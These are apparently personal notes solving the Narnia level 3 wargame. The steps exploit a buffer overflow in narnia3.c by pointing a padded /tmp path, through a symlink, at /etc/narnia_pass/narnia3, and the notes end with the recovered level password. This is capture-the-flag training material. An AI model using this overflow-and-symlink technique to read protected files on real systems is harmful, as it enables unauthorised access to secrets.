cd /narnia
cat narnia3.c
buffer overflow when copying buf into ifile, overflowing into ofile
ending substring of input file path must be output file path
/tmp/[folder]/[padding]/tmp/[folder]/[filename] must be input file path

create folder /tmp/hn3
create output file /tmp/hn3/o.txt
chmod a+w o.txt
create input folder (padding). Experimentally derived "aaaaaaaaaaaaaaaaaaaaaaa"
create folder /tmp/hn3/aaaaaaaaaaaaaaaaaaaaaaa/tmp/hn3
create symlink in this folder (ln -s /etc/narnia_pass/narnia3 /tmp/hn3/aaaaaaaaaaaaaaaaaaaaaaa/tmp/hn3/o.txt)
in narnia folder run:
./narnia3 /tmp/hn3/aaaaaaaaaaaaaaaaaaaaaaa/tmp/hn3/o.txt
cat /tmp/hn3/o.txt
thaenohtai
